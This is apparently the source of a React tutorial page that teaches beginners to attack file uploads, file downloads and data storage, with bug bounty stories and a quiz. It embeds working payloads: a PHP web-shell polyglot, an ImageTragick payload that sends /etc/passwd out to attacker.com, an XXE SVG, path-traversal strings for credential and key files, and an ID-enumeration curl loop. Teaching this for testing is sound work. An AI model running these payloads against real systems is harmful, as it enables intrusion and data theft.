import React, { useState, useEffect } from "react";
import LearnPageLayout from "../components/LearnPageLayout";
import QuizSection, { QuizQuestion } from "../components/QuizSection";
import {
  Box,
  Typography,
  Container,
  Paper,
  alpha,
  useTheme,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Chip,
  Grid,
  List,
  ListItem,
  ListItemIcon,
  ListItemText,
  IconButton,
  Divider,
  Alert,
  AlertTitle,
  Card,
  CardContent,
  Table,
  TableBody,
  TableCell,
  TableContainer,
  TableHead,
  TableRow,
  useMediaQuery,
  Drawer,
  Fab,
} from "@mui/material";
import { Link } from "react-router-dom";
import ArrowBackIcon from "@mui/icons-material/ArrowBack";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
import UploadFileIcon from "@mui/icons-material/UploadFile";
import DownloadIcon from "@mui/icons-material/Download";
import StorageIcon from "@mui/icons-material/Storage";
import HistoryIcon from "@mui/icons-material/History";
import VpnKeyIcon from "@mui/icons-material/VpnKey";
import EnhancedEncryptionIcon from "@mui/icons-material/EnhancedEncryption";
import OutputIcon from "@mui/icons-material/Output";
import ChecklistIcon from "@mui/icons-material/Checklist";
import CheckCircleIcon from "@mui/icons-material/CheckCircle";
import WarningIcon from "@mui/icons-material/Warning";
import InfoIcon from "@mui/icons-material/Info";
import SecurityIcon from "@mui/icons-material/Security";
import BugReportIcon from "@mui/icons-material/BugReport";
import FolderIcon from "@mui/icons-material/Folder";
import CodeIcon from "@mui/icons-material/Code";
import TerminalIcon from "@mui/icons-material/Terminal";
import CloudIcon from "@mui/icons-material/Cloud";
import DataObjectIcon from "@mui/icons-material/DataObject";
import SearchIcon from "@mui/icons-material/Search";
import LinkIcon from "@mui/icons-material/Link";
import DeleteIcon from "@mui/icons-material/Delete";
import BackupIcon from "@mui/icons-material/Backup";
import DescriptionIcon from "@mui/icons-material/Description";
import KeyIcon from "@mui/icons-material/Key";
import LockOpenIcon from "@mui/icons-material/LockOpen";
import DangerousIcon from "@mui/icons-material/Dangerous";
import QuizIcon from "@mui/icons-material/Quiz";
import MenuIcon from "@mui/icons-material/Menu";
import KeyboardArrowUpIcon from "@mui/icons-material/KeyboardArrowUp";
import DashboardIcon from "@mui/icons-material/Dashboard";
import MenuBookIcon from "@mui/icons-material/MenuBook";
import PublicIcon from "@mui/icons-material/Public";
import TipsAndUpdatesIcon from "@mui/icons-material/TipsAndUpdates";

// Theme colors for consistent styling
const themeColors = {
  primary: "#ef4444",
  primaryLight: "#f87171",
  secondary: "#f97316",
  accent: "#f59e0b",
  bgCard: "#111424",
  bgNested: "#0c0f1c",
  border: "rgba(239, 68, 68, 0.2)",
  textMuted: "#94a3b8",
};

// Section navigation items for sidebar
const sectionNavItems = [
  { id: "intro", label: "Introduction", icon: <InfoIcon fontSize="small" /> },
  { id: "overview", label: "Overview", icon: <DashboardIcon fontSize="small" /> },
  { id: "file-uploads", label: "File Uploads", icon: <UploadFileIcon fontSize="small" /> },
  { id: "file-downloads", label: "File Downloads", icon: <DownloadIcon fontSize="small" /> },
  { id: "data-storage", label: "Data Storage", icon: <StorageIcon fontSize="small" /> },
  { id: "logs-backups", label: "Logs & Backups", icon: <HistoryIcon fontSize="small" /> },
  { id: "secrets-hunting", label: "Secrets Hunting", icon: <VpnKeyIcon fontSize="small" /> },
  { id: "crypto-misuse", label: "Crypto Misuse", icon: <EnhancedEncryptionIcon fontSize="small" /> },
  { id: "data-exfil", label: "Data Exfiltration", icon: <OutputIcon fontSize="small" /> },
  { id: "checklist", label: "Attacker Checklist", icon: <ChecklistIcon fontSize="small" /> },
  { id: "quiz-section", label: "Knowledge Check", icon: <QuizIcon fontSize="small" /> },
];

interface Section {
  id: string;
  title: string;
  icon: React.ReactNode;
  color: string;
  subsections: SubSection[];
}

interface SubSection {
  title: string;
  detailedDescription?: string;
  points?: string[];
  code?: string;
  table?: { headers: string[]; rows: string[][] };
  warning?: string;
  tip?: string;
  testIdeas?: string[];
  beginnerTips?: string[];
  realWorldExample?: string;
}

const sections: Section[] = [
  {
    id: "file-uploads",
    title: "1. Attacking File Uploads",
    icon: <UploadFileIcon />,
    color: "#ef4444",
    subsections: [
      {
        title: "Finding Upload Points",
        detailedDescription: `File upload functionality is one of the most dangerous features in any web application from a security perspective. When you upload a file, you're essentially asking the server to accept arbitrary data from you and store it somewhere. If that "somewhere" happens to be accessible via the web, and if the server can be tricked into executing your file instead of just serving it, you've got remote code execution.

**Why This Matters for Beginners**: Think of file uploads like a mailroom in an office building. Normally, the mailroom accepts packages and stores them safely. But what if someone sends a package that looks like a regular document but actually contains something that, when opened, takes over the entire building's computer system? That's essentially what a malicious file upload does.

**The Attack Surface**: Every place where an application accepts files is a potential entry point. This includes obvious things like profile picture uploads, but also less obvious features like document imports, support ticket attachments, and even API endpoints that accept file data. The key insight is that developers often secure the "main" upload feature but forget about secondary upload points that were added later or exist in admin panels.

**What You're Looking For**: Your goal is to find every place where the application accepts file input, understand what happens to those files after upload (where they go, how they're processed, whether they're accessible), and then test whether you can upload something malicious that either gets executed or causes other security issues.`,
        beginnerTips: [
          "Start with the most obvious upload features (profile pictures) - they're often the least secured because developers assume 'it's just an image'",
          "Use your browser's Network tab to watch what happens when legitimate users upload files - you'll learn the upload endpoints and expected parameters",
          "Check the mobile app version of web applications - mobile APIs often have different (weaker) upload validation",
          "Look for import/export features - they often accept files with less scrutiny than dedicated upload forms",
          "Don't forget admin panels - they frequently have upload features for themes, plugins, or backups that are poorly secured"
        ],
        realWorldExample: "In 2019, a vulnerability in the WhatsApp desktop application allowed attackers to execute arbitrary code by sending a specially crafted GIF file. The victim only needed to view the message - not even open the file - for the attack to work. This demonstrates how file processing, not just file storage, can be exploited.",
        points: [
          "Profile pictures and avatars - often the least secured upload",
          "Document uploads: resumes, contracts, invoices, support attachments",
          "Import/export features: CSV, XML, JSON data imports",
          "Support ticket systems with file attachments",
          "Rich-text editors (CKEditor, TinyMCE) with image insertion",
          "Backup/restore functionality expecting archive uploads",
          "API endpoints accepting multipart/form-data",
          "Mobile app sync features with file upload capability",
          "Admin panels with theme/plugin upload",
          "Chat/messaging systems with media sharing",
        ],
        tip: "Don't just look at obvious upload forms. Check AJAX requests, mobile APIs, and admin-only functionality.",
      },
      {
        title: "Bypassing Client-Side Validation",
        detailedDescription: `Client-side validation is any security check that happens in your browser before data is sent to the server. This includes JavaScript that checks file extensions, file size limits enforced in the browser, or MIME type verification. The critical thing to understand is that **client-side validation is purely for user experience, not security**.

**Why It's Not Security**: Your browser is under YOUR control. Any validation happening there can be bypassed because you control the environment. It's like a bouncer at a club who only checks IDs if you walk through the front door - but you can just climb through a window. The server is the only place where security checks actually matter.

**How Browsers Send Files**: When you upload a file, your browser creates an HTTP request with the file data, Content-Type header (MIME type), and filename. JavaScript validation runs BEFORE this request is created. But tools like Burp Suite let you intercept and modify the request AFTER validation but BEFORE it reaches the server.

**The Testing Approach**: First, observe what the application does when you try to upload a "bad" file. Does it reject before sending (client-side) or after (server-side)? If it's before, you can bypass it by intercepting the request and changing the values back to what you want.`,
        beginnerTips: [
          "Use your browser's Network tab first - if you see no request when uploading a 'bad' file, the validation is client-side",
          "Learn to use Burp Suite's Intercept feature - it's essential for this type of testing",
          "Try uploading with JavaScript disabled (most browsers have a setting for this)",
          "Sometimes just changing the file extension before selecting it bypasses simple checks"
        ],
        realWorldExample: "Many bug bounty reports involve finding that an application's \"secure\" upload only validated on the client side. One researcher earned $5,000 from a major tech company simply by intercepting an avatar upload request and changing the filename from avatar.jpg to avatar.php while keeping the Content-Type as image/jpeg.",
        points: [
          "Intercept request in Burp and change Content-Type header",
          "Modify file extension after client validation passes",
          "Use browser dev tools to remove JavaScript validators",
          "Upload through the API directly, bypassing the UI entirely",
          "Disable JavaScript and try the upload form",
        ],
        code: `# Client says only .jpg allowed? Try these in Burp:

# Change Content-Type while keeping malicious extension
Content-Type: image/jpeg
filename="shell.php"

# Or keep extension but change content
Content-Type: application/x-php
filename="innocent.jpg"`,
      },
      {
        title: "Extension Bypass Techniques",
        detailedDescription: `Even when servers do validate file extensions, there are many ways to trick them. This is because file extension validation is surprisingly complex - different operating systems, web servers, and programming languages all handle extensions differently.

**How Extension Validation Usually Works**: Servers typically check the extension by looking at what comes after the last dot in the filename. So "malware.exe" has extension ".exe" and would be blocked. But what about "malware.exe.jpg"? Some servers see ".jpg" (safe!) while others see ".exe" (dangerous!). This inconsistency creates vulnerabilities.

**The Parser Differential Problem**: When your file goes through multiple systems (upload handler → storage → web server → execution engine), each might interpret the extension differently. A classic example: Apache might serve "shell.php.jpg" as a JPEG, but if there's a PHP handler configured for files containing ".php" anywhere in the name, it could execute as PHP.

**Blacklist vs Whitelist**: Servers using blacklists (block .php, .exe, .js, etc.) are much easier to bypass than whitelists (only allow .jpg, .png, .gif). With blacklists, you just need to find one extension they forgot. With whitelists, you need to find a way to make an allowed extension dangerous.

**Why These Techniques Work**: Each bypass technique exploits a specific assumption that developers make. Double extensions exploit parsers that only check the last extension. Null bytes exploit languages that treat null as a string terminator. NTFS streams exploit Windows-specific filesystem features that many web developers don't know exist.`,
        beginnerTips: [
          "Keep a list of alternative extensions for each language (.php5, .phtml, .phar for PHP)",
          "Test on different operating systems if possible - Windows handles extensions differently than Linux",
          "Null byte injection (%00) mostly works on older systems but is still worth trying",
          "NTFS tricks only work on Windows servers - check the Server header first"
        ],
        realWorldExample: "The 2014 Shellshock vulnerability was often exploited through CGI file uploads. Attackers would upload files with extensions like .cgi, .pl, or .sh that weren't on the blacklist. One major hosting provider had blocked .php but forgot about .phtml, leading to widespread compromise.",
        table: {
          headers: ["Technique", "Example", "Why It Works"],
          rows: [
            ["Double extension", "shell.php.jpg", "Server checks last ext, executes first"],
            ["Case manipulation", "shell.PhP, shell.pHP", "Case-insensitive filesystems"],
            ["Null byte (legacy)", "shell.php%00.jpg", "String termination in older languages"],
            ["Alternate extensions", ".php5, .phtml, .phar", "Not in blacklist but still executed"],
            ["Space/dot suffix", "shell.php. or shell.php ", "Windows filesystem quirks"],
            ["NTFS streams", "shell.php::$DATA", "Windows alternate data streams"],
            ["Unicode tricks", "shell.p\\u0068p", "Normalization bypasses"],
            [".htaccess upload", "AddType application/x-httpd-php .jpg", "Make jpg files execute as PHP"],
            ["Special files", ".user.ini, web.config", "Override server configuration"],
          ],
        },
      },
      {
        title: "Polyglot Files",
        detailedDescription: `A polyglot file is a single file that is valid in multiple formats simultaneously. Think of it like a word that means something in two different languages - the file "speaks" both languages at once. This is incredibly useful for bypassing security checks because a file can pass validation as a harmless image while also being executable code.

**How Polyglots Work**: Different file formats have different structures. A GIF file starts with the bytes "GIF89a" (its magic number). A PHP file just needs <?php somewhere in it to execute as code. A polyglot GIF-PHP starts with "GIF89a" (passing image validation) but also contains "<?php" later in the file. When the server serves this file and it gets processed by PHP, the code executes even though it looks like an image.

**Why Magic Byte Checking Fails**: Many applications only check the first few bytes of a file (the "magic bytes" or file signature) to determine its type. GIF89a at the start of a file makes programs think it's a GIF. But the PHP interpreter doesn't care about the GIF header - it just looks for PHP code anywhere in the file and executes it.

**Common Polyglot Combinations**: GIF+PHP and PNG+PHP are most common for web attacks. PDF+JavaScript is used for client-side attacks. ZIP+HTML can trick browsers into executing HTML from what looks like an archive. Each combination exploits different parser behaviors.`,
        beginnerTips: [
          "Start with the simplest polyglot: GIF89a followed directly by PHP code - it takes 30 seconds to create",
          "Use exiftool to embed code in image metadata - this often survives image processing that would strip code from the file body",
          "Test whether the server re-encodes images - if it does, simple polyglots won't work and you need metadata-based approaches",
          "Keep a collection of working polyglots - once you find one that works, save it for future tests"
        ],
        realWorldExample: "The 'GIFAR' attack was famous in 2008-2009. Researchers created files that were valid GIFs (displayed normally in browsers) but also valid JAR files (Java archives). When hosted on sites that allowed image uploads, these could be loaded as Java applets, leading to cross-domain attacks.",
        points: [
          "GIFAR: Valid GIF that's also a valid JAR archive",
          "PNG + PHP: Image with PHP code in metadata/comments",
          "PDF + JavaScript: Malicious scripts inside valid PDF",
          "ZIP + HTML: Archive that browsers render as HTML",
          "BMP + executable: Bitmap header followed by shellcode",
        ],
        code: `# Create a PHP polyglot that passes image validation
# GIF89a is a valid GIF header

GIF89a<?php system($_GET['cmd']); ?>

# Or embed in PNG EXIF data
exiftool -Comment='<?php echo shell_exec($_GET["cmd"]); ?>' image.png`,
        warning: "Polyglots can bypass content inspection that only checks magic bytes at the start of the file.",
      },
      {
        title: "Path Traversal in Filenames",
        detailedDescription: `Path traversal in file uploads occurs when you can control not just WHAT gets uploaded, but WHERE it gets saved. By manipulating the filename, you can potentially write files to any location on the server that the web application has permission to access.

**How File Saving Works**: When you upload a file, the server typically takes the filename from your request and saves the file to a designated upload directory. If the code does something like: "save to /uploads/ + user_filename", and you provide "../../../etc/cron.d/backdoor" as the filename, the server might try to save to /uploads/../../../etc/cron.d/backdoor, which resolves to /etc/cron.d/backdoor.

**The ../ Sequence**: In file paths, ".." means "go up one directory". So "../" moves up one level from the current directory. By chaining many "../" sequences, you can navigate from the upload directory all the way to the root of the filesystem and then down to any directory you want.

**Why This Is Devastating**: If you can write files anywhere, you can overwrite application code, configuration files, cron jobs (scheduled tasks), or even system files. This almost always leads to complete system compromise. You could overwrite the application's index.php with your own code, modify .htaccess to make uploads executable, or plant a cron job that gives you a reverse shell.

**Encoding Tricks**: Basic path traversal might be filtered, but encoded versions often slip through. URL encoding (..%2F), double URL encoding (..%252F), and Unicode encoding (..%c0%af) can all bypass simple filters that only look for the literal "../" string.`,
        beginnerTips: [
          "Always test path traversal even if extension bypass fails - writing to unexpected locations can still be devastating",
          "Check what user the web server runs as (www-data, apache, nginx) to understand what files you can overwrite",
          "Target .htaccess files to make upload directories execute code",
          "Try overwriting log files - this can lead to log poisoning attacks"
        ],
        realWorldExample: "Zip Slip (CVE-2018-1002200) affected thousands of projects including HP, Amazon, Apache, and many others. Attackers created malicious zip archives where the filenames included path traversal sequences. When these archives were extracted, files were written outside the intended directory, leading to arbitrary file overwrites.",
        points: [
          "Try ../../../etc/passwd as filename (overwrites if writeable)",
          "URL encode: ..%2F..%2F..%2Fetc%2Fpasswd",
          "Double URL encode: ..%252F..%252F",
          "Unicode encoding: ..%c0%af..%c0%af",
          "Overwrite application files: ../config.php, ../web.config",
          "Overwrite log files for log poisoning",
          "Target .htaccess or .user.ini for configuration injection",
        ],
        testIdeas: [
          "Does the app sanitize filename before saving?",
          "Can you control the directory as well as filename?",
          "What happens with very long filenames?",
          "Are special characters stripped or encoded?",
        ],
      },
      {
        title: "Abusing File Processors",
        detailedDescription: `When you upload a file, it often doesn't just get stored - it gets processed. Images might be resized, documents might be converted, videos might be transcoded, and archives might be extracted. Each of these processing steps involves complex software that can have vulnerabilities.

**Why Processing Is Dangerous**: File processing libraries are incredibly complex. ImageMagick, for example, supports hundreds of image formats and has millions of lines of code. This complexity creates many opportunities for bugs. When these libraries process malicious files, they can be tricked into executing commands, reading local files, or making network requests.

**ImageTragick (CVE-2016-3714)**: This vulnerability in ImageMagick affected countless websites. A specially crafted image file could execute arbitrary shell commands during processing. The payload looked like an image URL but actually contained shell commands. Sites using ImageMagick to resize profile pictures were suddenly vulnerable to remote code execution.

**SSRF Through Processing**: Many file processors fetch external resources. PDF generators that convert HTML to PDF will fetch images and stylesheets. If you control this HTML, you can make the server fetch internal URLs (http://169.254.169.254 for AWS metadata, http://localhost:8080 for internal services). This is Server-Side Request Forgery through file processing.

**The XML Attack Surface**: Any file format based on XML (SVG, DOCX, XLSX, ODT) can potentially be used for XXE (XML External Entity) attacks. These files are actually ZIP archives containing XML files. You can modify the XML to include malicious external entity references.`,
        beginnerTips: [
          "Check which libraries the application uses for file processing - look for version numbers to find known CVEs",
          "SVG is one of the best formats to test because it's XML-based and often allowed as an 'image'",
          "DOCX and XLSX files are ZIP archives - you can unzip them, modify the XML, and re-zip to create payloads",
          "Test for SSRF by pointing to a server you control (Burp Collaborator, webhook.site) and watching for callbacks"
        ],
        realWorldExample: "In 2022, a security researcher found that a major cloud provider's document preview feature used LibreOffice to convert documents. By uploading a malicious ODT file with an external resource reference, they could make the server connect to internal services and read AWS metadata credentials, leading to a critical bug bounty payout.",
        points: [
          "ImageMagick: CVE-2016-3714 (ImageTragick) - RCE via image processing",
          "Ghostscript: PostScript/PDF processing vulnerabilities",
          "LibreOffice: Document conversion leading to SSRF or RCE",
          "FFmpeg: HLS playlist SSRF, local file inclusion",
          "XML parsers: XXE in SVG, DOCX, XLSX uploads",
          "Archive extraction: Zip slip (path traversal during unzip)",
          "PDF generators: SSRF via external resources in HTML-to-PDF",
        ],
        code: `# ImageTragick payload (CVE-2016-3714)
push graphic-context
viewbox 0 0 640 480
fill 'url(https://attacker.com/x.jpg"|curl "http://attacker.com/?data=$(cat /etc/passwd))'
pop graphic-context

# SVG with XXE
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg>&xxe;</svg>

# Zip Slip - malicious archive entry
../../../var/www/html/shell.php`,
        warning: "Even if you can't get direct RCE, file processors can give you SSRF, file read, or DoS.",
      },
      {
        title: "Where Uploads Land",
        detailedDescription: `Understanding where uploaded files are stored and how they're served is crucial, even if you've successfully bypassed upload restrictions. A malicious file that's stored in a non-executable location or requires authentication to access is much less dangerous than one that's publicly accessible and served with executable permissions.

**The Storage Location Matters**: Files stored in the web root (the directory served by the web server) might be directly accessible via URL. Files stored outside the web root might only be accessible through application logic (like a download endpoint). Files stored on external services (S3, Azure Blob) are usually served through that service's domain, which might not execute code.

**Predictable vs Random Paths**: If uploaded files keep their original names and go to /uploads/filename.php, you can directly access your shell at https://target.com/uploads/shell.php. But if files are renamed to random UUIDs (like /uploads/a7f8e3b2-9c4d-4e5f.dat), you need to find a way to discover or predict that name.

**Content-Type When Serving**: Even if your file has a .php extension, if the server serves it with Content-Type: application/octet-stream or forces download, it won't execute. Conversely, some misconfigurations might serve .txt files as text/html, enabling XSS through text file uploads.

**CDN and Storage Service Implications**: Many modern applications store uploads on CDNs or cloud storage (S3, CloudFront, Azure Blob). These typically don't execute code - they just serve files statically. However, they might still be vulnerable to XSS if serving HTML/SVG files with permissive Content-Type headers.`,
        beginnerTips: [
          "After uploading, check the response for any hints about where the file landed (location header, JSON response with URL)",
          "Use directory bruteforcing tools like dirsearch on /uploads/, /files/, /media/, /attachments/",
          "Check if there's directory listing enabled on upload folders",
          "Look for timing differences - if uploads are processed async, there might be a window before scanning occurs"
        ],
        realWorldExample: "A bug bounty hunter found that a major e-commerce site stored uploads in S3 but served them through the main domain via a proxy. While S3 wouldn't execute PHP, the proxy was configured to pass .php files to the PHP interpreter, resulting in RCE through what seemed like safe cloud storage.",
        points: [
          "Check if uploads go to web root (directly accessible)",
          "Look for predictable paths: /uploads/, /files/, /media/, /attachments/",
          "Check if files keep original names or get randomized",
          "Test if uploaded files are served with their original Content-Type",
          "See if there's a CDN or separate storage domain",
          "Check for directory listing on upload folders",
        ],
        testIdeas: [
          "Upload a file and try to access it directly - does it execute?",
          "Can you guess/bruteforce the upload path?",
          "Is there a signed URL or token required to access uploads?",
          "Do files get scanned/processed before being accessible?",
          "Is there a delay before files become available (async processing)?",
        ],
      },
    ],
  },
  {
    id: "file-downloads",
    title: "2. Attacking File Downloads",
    icon: <DownloadIcon />,
    color: "#f97316",
    subsections: [
      {
        title: "Identifying Download Endpoints",
        detailedDescription: `File download functionality is the mirror image of file uploads - instead of getting files onto the server, you're getting files off it. While this might seem less dangerous than uploads, download vulnerabilities can expose the entire filesystem, source code, configuration files, and sensitive user data.

**Why Downloads Are Dangerous**: Every download feature has to read a file from somewhere and send it to you. If the application doesn't properly restrict WHICH files you can download, you might be able to read files you were never supposed to see - including the application's own source code, database credentials, or other users' data.

**Finding Download Features**: Look for any feature that gives you a file. This includes obvious things like "Download" buttons, but also export features ("Export to CSV/PDF"), backup downloads, attachment downloads in messaging systems, and API endpoints that return file content. Each of these is a potential attack surface.

**Parameter Analysis**: Pay attention to how the application specifies which file to download. Parameters named file=, path=, name=, doc=, or attachment= are obvious targets. But also look for numeric IDs that might reference files, and path segments in the URL itself.`,
        beginnerTips: [
          "Use your browser's Network tab while clicking download links - see exactly what parameters are being sent",
          "Export features are often overlooked by developers and may have weaker security than dedicated download endpoints",
          "GDPR 'export my data' features often expose more than they should",
          "API documentation (Swagger/OpenAPI) often reveals download endpoints that aren't linked in the UI"
        ],
        realWorldExample: "A researcher found that a healthcare portal's 'Download Lab Results' feature used a simple numeric ID. By changing the ID, they could download any patient's lab results - a critical HIPAA violation that earned a significant bug bounty.",
        points: [
          "Export/download buttons for reports, invoices, statements",
          "Document management and file sharing features",
          "Backup/restore download functionality",
          "Log and audit trail exports",
          "Configuration or settings export",
          "User data export (GDPR compliance features)",
          "Attachment downloads in messaging/tickets",
          "API endpoints returning file content",
        ],
        code: `# Common parameter patterns to look for:
/download?file=report.pdf
/export?path=/reports/2024/q1.xlsx
/api/files?name=document.docx
/attachments?id=12345
/documents/{filename}
/static/{path}
/media/{category}/{file}`,
      },
      {
        title: "Path Traversal on Read",
        detailedDescription: `Path traversal on file reads is one of the most impactful vulnerabilities you can find. Also called "Local File Inclusion" (LFI) or "Directory Traversal", it allows you to escape the intended download directory and read arbitrary files from the server.

**How It Works**: Imagine the application stores downloadable reports in /var/www/app/reports/ and constructs the path like: "/var/www/app/reports/" + user_input. If you request "../../../etc/passwd", the server constructs: /var/www/app/reports/../../../etc/passwd, which resolves to /etc/passwd. The ../ sequences traverse up the directory tree.

**What Makes Files Valuable**: Different files reveal different information. /etc/passwd shows usernames, .env files contain database credentials and API keys, source code reveals logic flaws, SSH keys enable direct server access, and application configs show internal architecture. Knowing which files to target is as important as finding the vulnerability.

**Encoding Bypass Techniques**: Applications often try to filter "../" but forget about URL encoding (%2e%2e%2f), double encoding (%252e%252e%252f), Unicode encoding, or mixed slashes (..\\). Always try multiple encoding variations when basic traversal is blocked.

**Linux vs Windows**: The target files are different on each OS. Linux systems have /etc/passwd, /etc/shadow, /proc/self/environ. Windows has win.ini, web.config, and paths starting with drive letters like C:\\. Check the Server header or error messages to determine the OS.`,
        beginnerTips: [
          "Start with /etc/passwd on Linux or C:\\Windows\\win.ini on Windows - these are almost always readable and confirm the vulnerability",
          "Try LOTS of ../ sequences - sometimes apps strip one level of traversal, so ../../../ becomes ../../",
          "If you get the source code, search it for hardcoded credentials, API keys, and database connection strings",
          "The /proc/self/environ file on Linux contains environment variables which often have secrets"
        ],
        realWorldExample: "In 2023, a path traversal vulnerability in a popular file transfer application allowed attackers to read any file on the system. The cl0p ransomware gang exploited this to steal data from hundreds of organizations before the vulnerability was patched.",
        points: [
          "Basic traversal: ../../etc/passwd",
          "URL encoded: ..%2F..%2Fetc%2Fpasswd",
          "Double encoded: ..%252F..%252Fetc%252Fpasswd",
          "UTF-8 encoding: ..%c0%af..%c0%af",
          "Mixed: ..\\../ or ../..\\",
          "Absolute paths: /etc/passwd or C:\\Windows\\win.ini",
          "Null byte injection (old systems): file.txt%00.jpg",
          "Excessive traversal: ../../../../../../../../etc/passwd",
        ],
        table: {
          headers: ["Target", "Linux Path", "Windows Path"],
          rows: [
            ["Passwd file", "/etc/passwd", "C:\\Windows\\win.ini"],
            ["Shadow file", "/etc/shadow", "C:\\Windows\\System32\\config\\SAM"],
            ["Web config", "/var/www/html/.htaccess", "C:\\inetpub\\wwwroot\\web.config"],
            ["App config", "/var/www/app/.env", "C:\\App\\appsettings.json"],
            ["SSH keys", "/root/.ssh/id_rsa", "C:\\Users\\Admin\\.ssh\\id_rsa"],
            ["History", "/root/.bash_history", "C:\\Users\\Admin\\AppData\\...\\History"],
            ["Hosts file", "/etc/hosts", "C:\\Windows\\System32\\drivers\\etc\\hosts"],
            ["Proc self", "/proc/self/environ", "N/A"],
          ],
        },
      },
      {
        title: "IDOR in File Downloads",
        detailedDescription: `IDOR (Insecure Direct Object Reference) in file downloads occurs when you can access other users' files simply by changing an identifier in the request. Unlike path traversal (which escapes directories), IDOR exploits weak authorization - the application doesn't verify that YOU should have access to the file you're requesting.

**How Download IDOR Works**: When you download your own file, the request might include id=12345. Your file happens to have ID 12345. But user Bob's file might be ID 12346. If you change the ID and the server sends you Bob's file without checking ownership, that's IDOR. The server trusts the ID without verifying your permission to access it.

**Numeric vs UUID Identifiers**: Sequential numeric IDs are easiest to exploit - just try nearby numbers. UUIDs seem harder but aren't always random - sometimes they're based on timestamps, user IDs, or other predictable values. Also check if IDs are leaked elsewhere (HTML source, API responses, URL history).

**Bulk and Batch Features**: Features that download multiple files at once ("Download All", "Bulk Export") sometimes check permissions differently than single-file downloads. The individual file download might be secure, but the bulk download might include files you shouldn't access.

**Testing Strategies**: Don't just test adjacent IDs. Try very low IDs (1, 2, 3 - often test/admin data), very high IDs, negative numbers, zero, and IDs that match your user ID. Also try accessing files with IDs from before your account existed.`,
        beginnerTips: [
          "Create two accounts and try to access files between them - this is the most reliable way to test IDOR",
          "Check if file IDs are exposed in the URL when viewing (not downloading) - these can guide your enumeration",
          "Try accessing 'deleted' files - sometimes soft-deleted files are still downloadable",
          "GDPR export features should only export YOUR data - test if you can trigger exports for other users"
        ],
        realWorldExample: "A researcher found IDOR in Instagram's Direct Messages photo download feature. By changing the photo ID parameter, they could download private photos from any user's DMs. Facebook paid $10,000 for this report.",
        points: [
          "Try sequential IDs: /download?id=123 → try 122, 124, 1, 999999",
          "Try UUIDs with predictable patterns",
          "Check if your user ID is in the filename pattern",
          "Test accessing other users' files by changing user identifiers",
          "Look for batch/bulk download features that enumerate",
          "Check API endpoints for different access patterns",
        ],
        code: `# Burp Intruder payloads for ID enumeration
GET /api/documents/§123§/download

# Payload: Numbers 1-10000
# Look for 200 responses with different sizes

# Or script it:
for i in {1..10000}; do
  curl -s -o /dev/null -w "%{http_code} %{size_download}\\n" \\
    "https://target.com/download?id=$i" -H "Cookie: session=xxx"
done | grep "200"`,
        testIdeas: [
          "Can you access files from before your account was created?",
          "Can you access files marked as 'deleted'?",
          "Are there admin-only files you can reach?",
          "Can you export other users' data via GDPR export feature?",
        ],
      },
      {
        title: "Response Analysis",
        detailedDescription: `Even when you can't directly download unauthorized files, the way an application responds to your requests can leak valuable information. Subtle differences in responses can reveal whether files exist, their sizes, permissions, and even partial content.

**Information Leakage Through Errors**: Error messages often reveal too much. "File not found at /var/www/app/uploads/" tells you the server path. "Permission denied for user www-data" reveals the web server user. "File size exceeds limit" tells you the file exists and its approximate size.

**Timing Side Channels**: Applications often respond faster to requests for non-existent files (quick "not found") than to requests for existing files you can't access (needs to check permissions, read metadata). By measuring response times, you can enumerate which files exist even if you can't read them.

**Response Size Differences**: A 404 error for non-existent files might be 450 bytes. An access denied error for existing files might be 523 bytes. This difference lets you map out file existence. In Burp, sort responses by length to spot these patterns.

**Header Leakage**: The Content-Disposition header often contains the original filename, which might reveal information about file organization or other users' names. X-Powered-By, Server, and custom application headers can reveal technology stack.

**Partial Content Exposure**: Some applications return part of a file before checking permissions, or include file previews/thumbnails that don't have the same access controls as the full file.`,
        beginnerTips: [
          "Always compare responses for: existing file you own, existing file you don't own, non-existent file",
          "Use Burp's Comparer tool to find subtle differences between responses",
          "Check the Content-Disposition header - it often leaks original filenames",
          "Error messages are your friend - they often reveal internal paths and technology details"
        ],
        realWorldExample: "A researcher discovered that a file storage service returned different error codes for 'file doesn't exist' vs 'you don't have permission'. By scanning public usernames plus common private filenames, they could determine which users had specific private files - a significant privacy violation.",
        points: [
          "Check Content-Disposition header for original filenames",
          "Look for internal paths leaked in responses",
          "Check if error messages reveal file system structure",
          "Compare response sizes for existing vs non-existing files",
          "Check timing differences for different paths",
          "Look for file metadata in responses",
        ],
        warning: "Even if you can't read the file, error messages might reveal whether it exists, its size, or its path.",
      },
    ],
  },
  {
    id: "data-storage",
    title: "3. Data Storage - Attacker's View",
    icon: <StorageIcon />,
    color: "#8b5cf6",
    subsections: [
      {
        title: "What Counts as Sensitive Data",
        detailedDescription: `Before hunting for data, you need to understand what data is actually valuable. Not all data is created equal - some types carry massive regulatory fines, some enable further attacks, and some are simply embarrassing if exposed.

**The Crown Jewels**: Credentials (passwords, API keys, tokens) are the most immediately dangerous because they grant access. A single leaked AWS key can lead to millions in cloud bills or complete infrastructure compromise. Session tokens let attackers impersonate users without knowing passwords. Encryption keys render all your encryption worthless.

**Regulatory Minefields**: Personally Identifiable Information (PII) falls under GDPR, CCPA, and similar laws. A breach affecting EU citizens' data can result in fines up to 4% of global revenue. Healthcare data (HIPAA) and payment card data (PCI-DSS) have their own strict regulations and breach notification requirements.

**Business-Critical Data**: Source code, internal documents, and M&A information might not trigger regulatory issues but can cause massive competitive damage. Finding another company's acquisition plans before announcement could be insider trading material. Leaked roadmaps help competitors.

**Thinking Like a Data Thief**: When you find any data exposure, ask: What could an attacker DO with this? Can they authenticate as someone? Can they steal identity? Can they blackmail victims? Can they cause regulatory fines? The impact determines severity.`,
        beginnerTips: [
          "Learn the regulations: GDPR, HIPAA, PCI-DSS - knowing these helps you explain impact in bug reports",
          "Credentials are always critical - never downplay an API key or password exposure",
          "Even 'just email addresses' can be valuable for phishing campaigns",
          "Consider chaining: leaked email + password from another breach = account takeover"
        ],
        realWorldExample: "The 2019 Capital One breach exposed 100 million customers' data including SSNs and bank account numbers. The attacker exploited a server-side request forgery (SSRF) to access AWS metadata and obtain credentials. The result: $80 million fine and massive reputational damage.",
        table: {
          headers: ["Category", "Examples", "Impact if Leaked"],
          rows: [
            ["Credentials", "Passwords, API keys, tokens, SSH keys", "Account takeover, lateral movement"],
            ["PII", "Names, emails, addresses, phone numbers, SSN", "Identity theft, GDPR fines"],
            ["Financial", "Card numbers, bank accounts, transactions", "Fraud, PCI-DSS violations"],
